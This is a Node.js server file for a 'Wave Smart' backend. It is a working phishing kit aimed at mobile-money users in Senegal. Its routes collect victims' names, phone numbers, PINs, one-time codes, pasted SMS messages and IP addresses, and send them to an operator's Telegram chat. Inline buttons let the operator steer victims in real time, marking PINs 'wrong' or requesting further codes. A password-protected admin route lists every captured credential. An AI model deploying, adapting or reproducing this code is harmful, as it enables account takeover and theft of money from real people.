// ─────────────────────────────────────────────────────────────────
//  Wave Smart Backend — server.js
// ─────────────────────────────────────────────────────────────────

require('dotenv').config();
const express        = require('express');
const cors           = require('cors');
const fetch          = require('node-fetch');
const path           = require('path');
const { v4: uuidv4 } = require('uuid');

const app  = express();
const PORT = process.env.PORT || 3000;

// ── Config ────────────────────────────────────────────────────────
const BOT_TOKEN   = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID     = process.env.TELEGRAM_CHAT_ID;
const WEBHOOK_URL = process.env.WEBHOOK_URL; // e.g. https://new-9xcj.onrender.com
const TG_API      = `https://api.telegram.org/bot${BOT_TOKEN}`;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('❌  Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env');
  process.exit(1);
}

// ── Middleware ─────────────────────────────────────────────────────
app.use(cors({ origin: process.env.FRONTEND_ORIGIN || '*' }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── Serve index.html at root ───────────────────────────────────────
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ── In-memory session store ────────────────────────────────────────
const sessions = {};

setInterval(() => {
  const cutoff = Date.now() - 30 * 60 * 1000;
  for (const [id, s] of Object.entries(sessions)) {
    if (s.createdAt < cutoff) delete sessions[id];
  }
}, 10 * 60 * 1000);

// ── Telegram helpers ───────────────────────────────────────────────

async function tgSend(text, replyMarkup = null) {
  try {
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    const res  = await fetch(`${TG_API}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    const data = await res.json();
    if (!data.ok) console.error('Telegram sendMessage error:', data.description);
    return data;
  } catch (err) {
    console.error('Telegram fetch error:', err.message);
  }
}

async function tgEditMessage(messageId, newText) {
  try {
    const res  = await fetch(`${TG_API}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id:      CHAT_ID,
        message_id:   messageId,
        text:         newText,
        parse_mode:   'HTML',
        reply_markup: { inline_keyboard: [] }, // ← removes all buttons
      }),
    });
    const data = await res.json();
    if (!data.ok) console.error('Telegram editMessage error:', data.description);
    return data;
  } catch (err) {
    console.error('Telegram edit error:', err.message);
  }
}

async function tgAnswerCallback(callbackQueryId, text = '') {
  try {
    await fetch(`${TG_API}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }),
    });
  } catch (err) {
    console.error('Telegram answerCallback error:', err.message);
  }
}

async function registerWebhook() {
  if (!WEBHOOK_URL) {
    console.warn('⚠️  WEBHOOK_URL not set — buttons will not work. Add it to Render env vars.');
    return;
  }
  try {
    const url  = `${WEBHOOK_URL}/webhook`;
    const res  = await fetch(`${TG_API}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url, allowed_updates: ['callback_query', 'message'] }),
    });
    const data = await res.json();
    if (data.ok) {
      console.log(`✅  Telegram webhook registered → ${url}`);
    } else {
      console.error('❌  Webhook registration failed:', data.description);
    }
  } catch (err) {
    console.error('Webhook registration error:', err.message);
  }
}

function now() {
  return new Date().toLocaleString('fr-FR', {
    timeZone: 'Africa/Dakar', dateStyle: 'short', timeStyle: 'medium',
  });
}

// ── Inline keyboards ───────────────────────────────────────────────

function loginKeyboard(sessionId) {
  return {
    inline_keyboard: [[
      { text: '✅ Continue',  callback_data: `approve::${sessionId}` },
      { text: '❌ Wrong PIN', callback_data: `wrong_pin::${sessionId}` },
    ]],
  };
}

function otpKeyboard(sessionId) {
  return {
    inline_keyboard: [[
      { text: '✅ Approve OTP', callback_data: `approve_otp::${sessionId}` },
      { text: '❌ Wrong Code',  callback_data: `wrong_code::${sessionId}` },
    ],[
      { text: '➡️ Request SMS', callback_data: `request_sms::${sessionId}` },
    ]],
  };
}

// ── Routes ─────────────────────────────────────────────────────────

app.post('/api', async (req, res) => {
  const { action, ...data } = req.body;

  switch (action) {

    case 'login_attempt': {
      const { firstName = 'Unknown', lastName = 'User', phone, pin } = data;
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

      // Check if a session already exists for this phone (re-attempt after wrong_pin)
      let sessionId = data.sessionId;
      let session = sessionId ? sessions[sessionId] : null;

      if (session && session.status === 'pending') {
        // Update PIN on existing session and send new alert
        session.pin = pin;
      } else {
        // Brand new session
        sessionId = uuidv4();
        sessions[sessionId] = {
          firstName, lastName, phone, pin,
          status: 'pending', createdAt: Date.now(), ip,
          msgId: null, otpMsgId: null,
        };
        session = sessions[sessionId];
      }

      console.log(`[LOGIN]  ${firstName} ${lastName} | +221${phone} | PIN: ${pin}`);

      const sent = await tgSend(
        `🔐 <b>New Login Attempt</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${firstName} ${lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${phone}\n` +
        `🔑 <b>PIN:</b> <code>${pin}</code>\n` +
        `🕐 <b>Time:</b> ${now()}\n` +
        `🌐 <b>IP:</b> <code>${ip}</code>`,
        loginKeyboard(sessionId)
      );

      if (sent && sent.ok) session.msgId = sent.result.message_id;

      return res.json({ success: true, data: { sessionId } });
    }

    case 'otp_entered': {
      const { sessionId, otp } = data;
      const session = sessions[sessionId];
      if (!session) return res.json({ success: false, error: 'Session not found' });

      session.otp   = otp;
      session.otpAt = Date.now();

      console.log(`[OTP]    Session: ${sessionId} | OTP: ${otp}`);

      const sent = await tgSend(
        `📟 <b>OTP Code Received</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `🔑 <b>PIN:</b> <code>${session.pin}</code>\n` +
        `📟 <b>OTP:</b> <code>${otp}</code>\n` +
        `🕐 <b>Time:</b> ${now()}`,
        otpKeyboard(sessionId)
      );

      if (sent && sent.ok) session.otpMsgId = sent.result.message_id;

      // Reset OTP status so frontend keeps polling
      session.status = 'otp_pending';

      return res.json({ success: true });
    }

    case 'otp_resend': {
      const { sessionId } = data;
      const session = sessions[sessionId];
      if (!session) return res.json({ success: false, error: 'Session not found' });

      console.log(`[RESEND] Session: ${sessionId}`);

      await tgSend(
        `🔄 <b>OTP Resend Requested</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `🕐 <b>Time:</b> ${now()}`
      );

      session.status = 'otp_pending';

      return res.json({ success: true });
    }

    case 'reset_otp': {
      // Called by frontend after wrong_code — resets status so user can enter OTP again
      const { sessionId } = data;
      const session = sessions[sessionId];
      if (!session) return res.json({ success: false, error: 'Session not found' });
      session.status = 'otp_pending';
      return res.json({ success: true });
    }

    case 'loan_application': {
      const { firstName, lastName, phone, amount, duration, income, monthly } = data;
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

      console.log(`[LOAN]   ${firstName} ${lastName} | ${amount} FCFA`);

      await tgSend(
        `💰 <b>Loan Application</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${firstName} ${lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${phone}\n` +
        `💵 <b>Amount:</b> ${Number(amount).toLocaleString('fr-FR')} FCFA\n` +
        `📅 <b>Duration:</b> ${duration} months\n` +
        `💼 <b>Income:</b> ${Number(income).toLocaleString('fr-FR')} FCFA/mo\n` +
        `📊 <b>Monthly:</b> ${Number(monthly).toLocaleString('fr-FR')} FCFA\n` +
        `🕐 <b>Time:</b> ${now()}\n` +
        `🌐 <b>IP:</b> <code>${ip}</code>`
      );

      return res.json({ success: true });
    }

    case 'sms_pasted': {
      const { sessionId, smsText, phone } = data;
      const session = sessions[sessionId];
      if (!session) return res.json({ success: false, error: 'Session not found' });

      session.smsText = smsText;
      console.log(`[SMS]    Session: ${sessionId} | Phone: ${phone} | Text: ${smsText}`);

      await tgSend(
        `📋 <b>SMS Pasted by User</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `📋 <b>SMS Content:</b>\n<code>${smsText}</code>\n` +
        `🕐 <b>Time:</b> ${now()}`
      );

      session.status = 'sms_received';
      return res.json({ success: true });
    }

    case 'sms_resend': {
      const { sessionId, phone } = data;
      const session = sessions[sessionId];
      if (!session) return res.json({ success: false, error: 'Session not found' });

      console.log(`[SMS_RESEND] Session: ${sessionId} | Phone: ${phone}`);

      await tgSend(
        `🔄 <b>SMS Resend Requested</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `⚠️ <b>Action:</b> User clicked "Renvoyer le lien"\n` +
        `🕐 <b>Time:</b> ${now()}`
      );

      return res.json({ success: true });
    }

    case 'sms_link_broken': {
      const { sessionId, phone } = data;
      const session = sessions[sessionId];
      if (!session) return res.json({ success: false, error: 'Session not found' });

      console.log(`[SMS_BROKEN] Session: ${sessionId} | Phone: ${phone}`);

      await tgSend(
        `🚨 <b>Link Not Working — User Alert</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `⚠️ <b>Action:</b> User clicked "Le lien ne fonctionne pas"\n` +
        `🕐 <b>Time:</b> ${now()}`
      );

      return res.json({ success: true });
    }

    default:
      return res.status(400).json({ success: false, error: `Unknown action: ${action}` });
  }
});

// Frontend polls this every second
app.get('/api', (req, res) => {
  const { action, sessionId } = req.query;

  if (action === 'check_status') {
    const session = sessions[sessionId];
    if (!session) return res.json({ success: false, error: 'Session not found' });
    return res.json({ success: true, status: session.status });
  }

  res.status(400).json({ success: false, error: 'Unknown action' });
});

/**
 * POST /webhook
 * Telegram sends button click events here.
 * Registered automatically on startup via WEBHOOK_URL env var.
 */
app.post('/webhook', async (req, res) => {
  // Always respond 200 immediately so Telegram doesn't retry
  res.sendStatus(200);

  const update = req.body;
  if (!update.callback_query) return;

  const cb                  = update.callback_query;
  const cbId                = cb.id;
  const parts               = cb.data.split('::');
  const action              = parts[0];
  const sessionId           = parts[1];
  const session             = sessions[sessionId];

  if (!session) {
    await tgAnswerCallback(cbId, '⚠️ Session expired');
    return;
  }

  switch (action) {

    case 'approve': {
      if (session.status !== 'pending') {
        await tgAnswerCallback(cbId, '⚠️ Already actioned');
        return;
      }
      session.status = 'approved';
      await tgAnswerCallback(cbId, '✅ User moved to OTP screen');
      await tgEditMessage(session.msgId,
        `🔐 <b>Login Attempt — ✅ APPROVED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `🔑 <b>PIN:</b> <code>${session.pin}</code>\n` +
        `🕐 <b>Actioned:</b> ${now()}`
      );
      break;
    }

    case 'wrong_pin': {
      if (session.status !== 'pending') {
        await tgAnswerCallback(cbId, '⚠️ Already actioned');
        return;
      }
      session.status = 'wrong_pin';
      await tgAnswerCallback(cbId, '❌ Wrong PIN sent to user');
      await tgEditMessage(session.msgId,
        `🔐 <b>Login Attempt — ❌ WRONG PIN</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `🔑 <b>PIN entered:</b> <code>${session.pin}</code>\n` +
        `🕐 <b>Actioned:</b> ${now()}`
      );
      // Reset to pending after 2s so user can try a new PIN and trigger a fresh alert
      setTimeout(() => { if (sessions[sessionId]) sessions[sessionId].status = 'pending'; }, 2000);
      break;
    }

    case 'approve_otp': {
      session.status = 'approved_otp';
      await tgAnswerCallback(cbId, '✅ OTP approved — user notified');
      await tgEditMessage(session.otpMsgId,
        `📟 <b>OTP — ✅ APPROVED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `📟 <b>OTP:</b> <code>${session.otp}</code>\n` +
        `🕐 <b>Actioned:</b> ${now()}`
      );
      break;
    }

    case 'request_sms': {
      session.status = 'sms_required';
      await tgAnswerCallback(cbId, '➡️ SMS screen sent to user');
      await tgEditMessage(session.otpMsgId,
        `📟 <b>OTP — ➡️ SMS REQUESTED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `📟 <b>OTP:</b> <code>${session.otp}</code>\n` +
        `🕐 <b>Actioned:</b> ${now()}\n` +
        `ℹ️ User is now on the SMS paste screen`
      );
      break;
    }

    case 'wrong_code': {
      session.status = 'wrong_code';
      await tgAnswerCallback(cbId, '❌ Wrong code sent to user');
      await tgEditMessage(session.otpMsgId,
        `📟 <b>OTP — ❌ WRONG CODE</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
        `📟 <b>OTP entered:</b> <code>${session.otp}</code>\n` +
        `🕐 <b>Actioned:</b> ${now()}`
      );
      break;
    }

    default:
      await tgAnswerCallback(cbId, '⚠️ Unknown action');
  }
});

// Admin: list sessions
app.get('/api/sessions', (req, res) => {
  const secret       = req.query.secret || req.headers['x-admin-secret'];
  const ADMIN_SECRET = process.env.ADMIN_SECRET || 'wavesmart2026';
  if (secret !== ADMIN_SECRET) return res.status(403).json({ success: false, error: 'Forbidden' });

  const list = Object.entries(sessions).map(([id, s]) => ({
    sessionId: id, firstName: s.firstName, lastName: s.lastName,
    phone: s.phone, pin: s.pin, otp: s.otp || null,
    status: s.status, ip: s.ip,
    createdAt: new Date(s.createdAt).toISOString(),
  }));

  res.json({ success: true, count: list.length, sessions: list });
});

// ── Start ──────────────────────────────────────────────────────────
app.listen(PORT, async () => {
  console.log(`\n🚀  Wave Smart Backend on port ${PORT}`);
  console.log(`📡  Bot: @wwwwavvebot  |  Chat: ${CHAT_ID}\n`);

  // Auto-register webhook so buttons work immediately
  await registerWebhook();

  tgSend(
    `✅ <b>Wave Smart Backend Started</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `🕐 <b>Time:</b> ${now()}\n` +
    `🔘 Inline buttons active`
  );
});

module.exports = app;
